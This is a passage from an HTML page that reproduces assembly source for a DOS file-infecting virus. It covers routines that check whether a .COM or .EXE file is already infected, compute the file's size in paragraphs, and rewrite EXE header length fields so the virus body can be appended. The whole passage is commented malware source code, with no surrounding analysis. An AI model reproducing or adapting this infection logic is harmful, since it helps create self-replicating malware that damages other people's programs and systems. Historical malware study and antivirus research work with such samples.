ret</font>
<br>&nbsp;
<p><font color="#3333FF">;*** Proc: Check file is already infected ***</font>
<p><font color="#3333FF">Check_infect: mov si,104h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov di,offset Head_buf+4</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push cs</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop es</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov byte ptr [Com_or_exe],0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Flag for .COM</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cmp word ptr [di-04],5A4Dh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Is .EXE?</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jz Is_Exe</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov cx,0Ch&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; No, .COM file</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cld</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
repz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Already infected?</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cmpsb</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jnz Do_Infect&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Not yet</font>
<br><font color="#3333FF">Dont_Infect:&nbsp; stc</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ret</font>
<br><font color="#3333FF">Do_Infect:&nbsp;&nbsp;&nbsp; clc</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ret</font>
<br><font color="#3333FF">Is_Exe:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov
byte ptr [Com_or_exe],1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Flag for .EXE</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov cx,[offset Head_buf+14h]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; cx = Prog-IP</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cmp cx,offset VirBegin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Same as Vir-IP?</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jz Dont_Infect&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Yes, quit</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cmp word ptr [offset Head_buf+0Ch],0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Max extra pars=0?</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jz Dont_Infect&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Yes, quit</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov [Exe_ip],cx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Save prog-IP</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov cx,[Head_buf+16h]</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov [Exe_cs],cx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Save prog-cs</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov cx,[Head_buf+0Eh]</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov [R_ss],cx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Save prog-SS</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov cx,[Head_buf+10h]</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov [R_sp],cx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Save prog-SP</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jmp short Do_Infect</font>
<br>&nbsp;
<p><font color="#3333FF">;*** Proc: Calculate data for infection ***</font>
<p><font color="#3333FF">Calc_data:&nbsp;&nbsp;&nbsp; mov ax,4202h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Go to EOF</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
xor cx,cx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
xor dx,dx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int 21h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
test al,0Fh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Size mod
16 = 0 (File is exact x paragraps)?</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jz No_par_add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Yes, no extra par added</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
add ax,10h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Add paragraph</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
adc dx,0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Overflow -> Inc dx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
and ax,0FFF0h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Make paragraphs</font>
<br><font color="#3333FF">No_par_add:&nbsp;&nbsp; test byte ptr [Com_or_exe],1</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jnz Calc_exe</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
or dx,dx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jnz not_infect</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cmp ax,[maxcomsize]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; File too big?</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ja not_infect&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Yes, quit</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cmp ax,[VirSize]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; File too small?</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jbe Not_Infect&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Yes, quit</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov [ProgSize],ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Save program-size</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov cl,4</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
shr word ptr [ProgSize],cl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; In paragraphs</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov dx,ax</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
xor cx,cx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call Cng_file_ptr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Go to EOF</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
clc</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ret</font>
<br><font color="#3333FF">Not_Infect:&nbsp;&nbsp; stc</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ret</font>
<p><font color="#3333FF">Calc_exe:&nbsp;&nbsp;&nbsp;&nbsp; push ax</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push dx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
add ax,100h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; 100 bytes stack</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
adc dx,0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Overflow - inc dx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov cx,dx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov dx,ax</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call Cng_file_ptr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Go to EOF</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push bx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
add ax,[VirSize]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; New exe-length</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
adc dx,0</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov bx,200h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; For header: / 512</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
div bx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
or dx,dx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jz No_Correct</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
inc ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Files below
2.000.000h bytes - length correction</font>
<br><font color="#3333FF">No_Correct:&nbsp;&nbsp; mov [Head_buf+2],dx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Save new file-length</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov [Head_buf+4],ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; '&nbsp; ' ' ' '&nbsp; ' '&nbsp;&nbsp;&nbsp; '</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop bx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop dx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop ax</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call Calc_cs_ss</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
